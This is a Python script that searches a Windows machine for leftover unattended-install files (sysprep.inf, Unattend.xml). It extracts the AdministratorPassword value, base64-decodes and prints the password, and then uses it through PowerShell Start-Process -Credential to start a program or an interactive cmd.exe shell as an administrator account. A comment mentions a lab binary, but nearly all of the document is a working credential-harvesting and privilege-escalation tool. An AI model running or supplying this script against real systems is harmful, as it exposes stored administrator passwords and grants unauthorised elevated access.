#!/usr/bin/python3

import os
import re
import base64
import subprocess as sp

def extract_password(file_path):
    """
    Opens a file, searches for the AdministratorPassword Value tag using regex.
    """
    pattern = r'<AdministratorPassword>\s*<Value>(.*?)</Value>'
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            match = re.search(pattern, content, re.DOTALL)
            if match:
                return match.group(1).strip()
    except Exception as e:
        print(f" [!] Could not read {file_path}: {e}")
    return None

def find_files(targets, base_dir="C:\\"):
    targets_found = list()
    print(f'Starting search for {targets} in {base_dir}...\n')
    
    for root, dirs, files in os.walk(base_dir):
        for file in files:
            if file.lower() in [t.lower() for t in targets]:
                path = os.path.join(root, file)
                print(f'[+] Found file: {file} in {path}')
                targets_found.append(file)
                
                extracted_val = extract_password(path)
                if extracted_val:
                    print(f'[*] Extracted Value: {extracted_val}')
                    
                    clean_val = extracted_val.strip()
                    missing_padding = len(clean_val) % 4
                    if missing_padding:
                        clean_val += '=' * (4 - missing_padding)
                    
                    try:
                        ascii_string = base64.b64decode(clean_val).decode('utf-8')
                        print(f'[+] Decoded Password: {ascii_string}')
                    except Exception:
                        ascii_string = clean_val
                        print(f'[*] Using password as plain text: {ascii_string}')
                    
                    # Target configuration
                    admin_user = "SuperAdministrator"
                    admin_pass = ascii_string
                    
                    # Define absolute paths to system tools to avoid 'File Not Found' errors
                    powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
                    cmd_path = "C:\\Windows\\System32\\cmd.exe"
                    
                    # Check if your lab binary exists; if not, fall back to launching an administrative command prompt
                    program_name = "NeedsAdminPrivilege.exe" 
                    program = os.path.abspath(program_name)
                    if not os.path.exists(program):
                        print(f"[!] {program_name} not found locally. Spawning interactive admin shell instead.")
                        program = cmd_path

                    # Command block strings
                    ps_script = f"""$secPass = ConvertTo-SecureString '{admin_pass}' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('{admin_user}', $secPass); Start-Process '{program}' -Credential $cred"""

                    # Execution block with explicit environment fallback
                    try:
                        print("[*] Attempting execution via explicit PowerShell path...")
                        sp.run([powershell_path, "-Command", ps_script], check=True)
                        print("[+] Session dispatch command sent successfully.")
                    except FileNotFoundError:
                        print("[!] System PowerShell executable path not found. Trying alternative method...")
                        try:
                            # Fallback method: Run directly via native shell interpretation
                            sp.run(f"powershell -Command \"{ps_script}\"", shell=True, check=True)
                            print("[+] Session dispatch command sent via shell wrapper.")
                        except Exception as e:
                            print(f"[!] Shell execution failed: {e}")
                    except Exception as e:
                        print(f"[!] Execution failed: {e}")
                        
                else:
                    print(f'[-] No matching password tags found in {file}.')

    print("\n[!] File search is complete")

if __name__ == '__main__':
    target_files = ["sysprep.inf", "autounattend.xml", "Unattend.xml"]
    
    # If scanning the entire C:\ drive is causing restricted directory errors or takes too long,
    # you can target common deployment paths directly, like "C:\\Windows\\Panther"
    find_files(targets=target_files, base_dir="C:\\Windows\\Panther")
    
    input("\nPress Enter to exit...")
